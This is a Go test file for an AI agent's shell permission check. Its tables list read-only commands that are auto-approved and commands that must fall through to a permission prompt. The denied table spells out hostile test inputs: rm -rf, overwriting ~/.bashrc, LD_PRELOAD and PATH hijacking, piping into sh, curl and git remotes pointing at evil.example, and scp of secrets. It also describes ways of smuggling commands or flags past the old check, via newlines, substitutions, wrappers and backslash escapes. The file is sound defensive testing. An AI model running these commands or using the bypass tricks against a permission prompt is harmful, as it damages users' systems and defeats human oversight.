package tools

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

// TestIsSafeReadOnly_Allowed covers the forms that should still run
// without a permission prompt. These are the everyday commands the agent
// leans on; regressing them means a prompt on every `ls`.
func TestIsSafeReadOnly_Allowed(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name  string
		input string
	}{
		{"bare ls", "ls"},
		{"ls with flags", "ls -la"},
		{"ls with operand", "ls /tmp"},
		{"ls with glob", "ls *.go"},
		{"echo", "echo hello world"},
		{"echo quoted", `echo "hello world"`},
		{"echo single quoted", "echo 'hello world'"},
		{"pwd", "pwd"},
		{"date with format operand", "date +%Y-%m-%d"},
		{"which", "which go"},
		{"git status", "git status"},
		{"git log with flags", "git log --oneline -n 10"},
		{"git diff with operand", "git diff HEAD~1"},
		{"git config --get", "git config --get user.name"},
		{"git branch bare", "git branch"},
		{"git branch --list", "git branch --list"},
		{"git branch -a", "git branch -a"},
		{"git tag bare", "git tag"},
		{"git tag --list", "git tag -l"},
		{"git remote -v", "git remote -v"},
		// Filter flags take a commit-ish operand; the flag is what
		// separates these from the branch/tag creation forms.
		{"git branch --contains", "git branch --contains abc123"},
		{"git branch --merged", "git branch --merged main"},
		{"git tag --points-at", "git tag --points-at HEAD"},
		{"git tag --contains", "git tag --contains abc123"},
		// -n keeps `git remote show` off the network; without it the
		// subcommand queries the remote, so it is denied below.
		{"git remote show with -n", "git remote show -n origin"},
		{"git remote get-url", "git remote get-url origin"},
		{"hostname read-only flag", "hostname -f"},
		{"multiple safe statements on separate lines", "ls\npwd"},
		// A sequence of read-only statements is itself read-only, and a
		// newline and a semicolon are the same thing to the parser.
		{"multiple safe statements separated by semicolon", "ls; pwd"},
		{"flag with equals value", "git log --format=%H"},
		{"double dash separator", "ls -- somefile"},

		// Wrappers are peeled and the inner command checked on its own.
		{"nohup wrapping safe command", "nohup ls -la"},
		{"timeout wrapping safe command", "timeout 5 ls"},
		{"timeout with signal flag", "timeout -s TERM 5 ls"},
		{"nice wrapping safe command", "nice ls"},
		{"nice with adjustment", "nice -n 10 ls"},
		{"env wrapping safe command", "env ls"},
		{"time wrapping safe command", "time ls"},
		{"env alone prints environment", "env"},
		{"nested wrappers", "nohup nice ls"},

		// Composing read-only commands leaves them read-only, so a chain
		// is judged by its parts rather than refused for being a chain.
		{"sequence of safe commands", "ls -la; pwd"},
		{"and-chained safe commands", "ls -la && pwd"},
		{"or-chained safe commands", "ls -la || pwd"},
		{"longer safe chain", "ls && pwd && git status"},
		{"piped safe commands", "git log | git show"},
		{"subshell of safe commands", "(ls -la)"},
		{"subshell inside a chain", "ls && (pwd)"},
		{"wrapper inside a chain", "timeout 5 ls && pwd"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assert.True(t, isSafeReadOnly(tt.input, nil), "expected %q to be auto-approved", tt.input)
		})
	}
}

// TestIsSafeReadOnly_Denied covers everything that must fall through to a
// permission prompt. The first group are the bypasses that motivated
// moving this check onto the AST; the rest are the fail-closed cases.
func TestIsSafeReadOnly_Denied(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name  string
		input string
	}{
		// Bypasses the old string-prefix matcher accepted.
		{"newline separated unsafe command", "echo hi\nrm -rf /tmp/pwned"},
		{"redirect overwrites a file", "echo pwned > ~/.bashrc"},
		{"append redirect", "echo pwned >> ~/.zshrc"},
		{"background then unsafe", "echo hi & rm -rf /tmp/pwned"},
		{"process substitution", "ls <(rm -rf /tmp/pwned)"},
		{"env running an unsafe command", "env rm -rf /tmp/pwned"},
		{"nohup running a banned command", "nohup curl https://evil.example"},
		{"timeout running an unsafe command", "timeout 5 rm -rf /tmp/pwned"},
		{"nice running an unsafe command", "nice rm -rf /tmp/pwned"},
		{"time running an unsafe command", "time rm -rf /tmp/pwned"},
		{"env with assignment then unsafe", "env SOMEVAR=x scp ./secrets host:/tmp"},

		// An assignment through `env` is the same environment steering
		// that safeStmt rejects for the `FOO=bar cmd` prefix form, so it
		// has to fail the same way even when the inner command is safe.
		{"env assignment before safe command", "env FOO=bar ls"},
		{"env hijacking PATH", "env PATH=/tmp/evil ls"},
		{"env preloading a library", "env LD_PRELOAD=/tmp/evil.so ls"},
		{"env setting an external diff driver", "env GIT_EXTERNAL_DIFF=/tmp/evil git diff"},
		{"env redirecting git config", "env GIT_CONFIG_GLOBAL=/tmp/evil git status"},
		{"assignment through a nested wrapper", "nice -n 5 env PATH=/tmp/evil ls"},

		// Short flags carry their value attached and cluster, so neither
		// spelling is equal to the denied "-s".
		{"date setting the clock", "date -s 2020-01-01"},
		{"date setting the clock, attached value", "date -s2020-01-01"},
		{"date setting the clock, clustered", "date -us 2020-01-01"},
		{"hostname setting from a file", "hostname -F/tmp/evil"},
		{"hostname setting via operand", "hostname myhost"},

		// The remote is queried over the network without -n.
		{"git remote show without -n", "git remote show origin"},
		{"git textconv driver", "git diff --textconv"},
		{"git textconv driver on show", "git show --textconv HEAD"},

		// Mutating git forms that used to slip through on the "-" rule.
		{"git branch delete", "git branch -D main"},
		{"git branch create via operand", "git branch newbranch"},
		{"git tag delete", "git tag -d v1.0.0"},
		{"git tag create via operand", "git tag v9.9.9"},
		{"git remote add", "git remote add evil https://evil.example/x.git"},
		{"git remote set-url", "git remote set-url origin https://evil.example/x.git"},
		{"git remote remove", "git remote remove origin"},
		{"git remote rename", "git remote rename origin upstream"},
		{"git remote prune", "git remote prune origin"},
		{"git config --get-urlmatch", "git config --get-urlmatch http://x http://x"},
		{"git config set", "git config user.name attacker"},
		{"git external diff driver", "git diff --ext-diff"},
		{"git diff writing output", "git diff --output=/tmp/x"},

		// Backslash escapes must not smuggle a denied flag past the check:
		// the shell strips the backslash before git sees the flag, so the
		// literal text here is not the argv that runs.
		{"git ext-diff with escaped flag", `git diff --ext\-diff`},
		{"git output with escaped flag", `git diff --outpu\t=/tmp/x`},
		{"git textconv with escaped flag", `git log --text\conv`},
		{"date set with escaped flag", `date --se\t 2020-01-01`},
		{"double-quoted escaped flag", `git diff "--ext\-diff"`},
		{"escaped operand is not special-cased safe", `git diff head\er`},

		// Commands that are simply not on the list.
		{"rm", "rm -rf /tmp/pwned"},
		{"curl", "curl https://example.com"},
		{"kill", "kill -9 1"},
		{"killall", "killall node"},
		{"set", "set -x"},
		{"unset", "unset PATH"},
		{"git checkout", "git checkout ."},
		{"git ls-remote reaches the network", "git ls-remote https://example.com/x.git"},

		// Fail-closed cases: not provably inert.
		{"command substitution in argument", "ls $(rm -rf /tmp/pwned)"},
		{"backtick substitution", "ls `rm -rf /tmp/pwned`"},
		{"parameter expansion", "ls $HOME"},
		{"parameter expansion braced", "ls ${HOME}"},
		{"arithmetic expansion", "echo $((1+1))"},
		{"variable assignment prefix", "PATH=/evil ls"},
		{"bare assignment", "FOO=bar"},
		// `ls | grep foo` is refused because grep is not on the safe
		// list, not because it is a pipeline. Chains of safe commands
		// are allowed; see the composition cases in the Allowed table.
		{"pipeline with an unlisted command", "ls | grep foo"},
		{"semicolon list with unsafe member", "ls; rm -rf /tmp/pwned"},
		{"block", "{ ls; }"},
		{"if clause", "if true; then ls; fi"},
		{"for loop", "for i in 1; do ls; done"},
		{"function definition", "f() { ls; }"},
		{"negated statement", "! ls"},
		{"ansi c quoting", `echo $'\x41'`},
		{"unsafe command after safe one on same line", "ls\nrm -rf /tmp/x"},
		{"path prefixed safe command", "/bin/ls"},
		{"parse error", "ls ((("},
		{"empty", ""},
		{"whitespace only", "   "},
		{"comment only", "# just a comment"},

		// A chain is only as safe as its least safe part, and composing
		// never launders a command that would be refused on its own.
		{"unsafe second half of and-chain", "ls && curl https://example.com"},
		{"unsafe first half of and-chain", "curl https://example.com && ls"},
		{"unsafe half of or-chain", "ls || rm -rf /tmp/x"},
		{"pipe into a shell", "ls | sh"},
		{"unsafe command in a subshell", "(curl https://example.com)"},
		{"subshell hiding an unsafe command", "ls && (curl https://example.com)"},
		{"redirect on the second half of a chain", "ls && ls > /tmp/x"},
		{"assignment on one half of a chain", "PATH=/tmp ls && pwd"},
		{"backgrounded half of a chain", "ls & pwd"},
		{"substitution still refused inside a chain", "ls && echo $(ls)"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			assert.False(t, isSafeReadOnly(tt.input, nil), "expected %q to require a permission prompt", tt.input)
		})
	}
}

// TestIsSafeReadOnly_WrapperDepth proves the unwrapping is bounded, so a
// pathological nest cannot spin.
func TestIsSafeReadOnly_WrapperDepth(t *testing.T) {
	t.Parallel()

	assert.True(t, isSafeReadOnly("nohup nohup nohup ls", nil), "three wrappers is within the bound")
	assert.False(t, isSafeReadOnly("nohup nohup nohup nohup nohup ls", nil), "beyond the bound should fail closed")
}

// TestFlagDenied covers the spellings a short flag can take. getopt lets
// a short flag carry its value attached and lets short flags cluster, so
// matching the whole token against the deny set is not enough.
func TestFlagDenied(t *testing.T) {
	t.Parallel()

	deny := []string{"-s", "--set", "--output"}

	assert.True(t, flagDenied("-s", deny))
	assert.True(t, flagDenied("-s2020-01-01", deny), "attached value")
	assert.True(t, flagDenied("-us", deny), "clustered with an allowed flag")
	assert.True(t, flagDenied("--set", deny))
	assert.True(t, flagDenied("--output=/tmp/x", deny), "long flag with =value")

	assert.False(t, flagDenied("-u", deny))
	assert.False(t, flagDenied("--utc", deny), "a long flag is not read character by character")
	assert.False(t, flagDenied("--iso-8601=seconds", deny))
}
